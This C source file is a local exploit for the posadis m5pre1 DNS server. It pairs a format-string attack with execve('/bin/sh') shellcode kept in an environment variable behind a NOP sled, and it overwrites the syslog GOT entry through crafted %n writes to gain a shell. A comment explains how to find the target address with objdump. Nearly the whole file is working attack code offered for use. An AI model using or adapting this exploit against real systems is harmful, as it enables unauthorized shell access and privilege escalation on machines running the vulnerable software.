/* local posadis m5pre1 exploit by eSDee of Netric - (www.netric.org)
 * ------------------------------------------------------------------
 * (discovered by kkr - http://online.securityfocus.com/bid/4378)
 * 
 * to find the retloc:
 * objdump -R posa-dis | grep syslog
 * 08063ddc R_386_JUMP_SLOT   syslog
 *
 */

#include <stdio.h>

#define RETLOC       0x08063ddc
#define RET          0xbffffdac

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int
padding(int write_byte, int already_written)
{
        int padding;
        write_byte += 0x100;
        already_written %= 0x100;
        padding = (write_byte - already_written) % 0x100;
        if (padding < 10)
                padding += 0x100;
        return padding;
}

int
main()
{
        char    format[512],
                writecode[8],
                egg[1024],
                *ptr;
        int     already_written = 0xfc,
                tmp,
                i;
        long    *addr_ptr;

        ptr = egg;
        for (i = 0; i < 1024 - strlen(shellcode) -1; i++) *(ptr++) = 0x90;
        for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];
        egg[1024 - 1] = '\0';

        memcpy(egg,"EGG=",4);
        putenv(egg);

        strcpy(format, "jjj");

        ptr = format+3;
        addr_ptr = (long *) ptr;

        for (i = 0; i < 4; i++) {
                *(addr_ptr++) = RETLOC + i;
                *(addr_ptr++) = 0xb0efb0ef;
        }
        *(ptr + 32) = 0;

        for (i = 0; i < 18; i++)
                strcat(format, "%08x.");

        for (i = 0; i <= 24; i += 8) {
                tmp = padding((RET >> i) & 0xff, already_written) + 10;
                sprintf(writecode, "%%%du%%n", tmp);
                strcat(format, writecode);
                already_written += tmp;
        }

        printf("local posadis m5pre1 exploit by eSDee of Netric - (www.netric.org)\n");
        printf("------------------------------------------------------------------\n");
        printf("return address : 0x%08x\n",RET);
        printf("return location: 0x%08x\n\n",RETLOC);

        execl("./posadis","posadis",format,NULL);
}

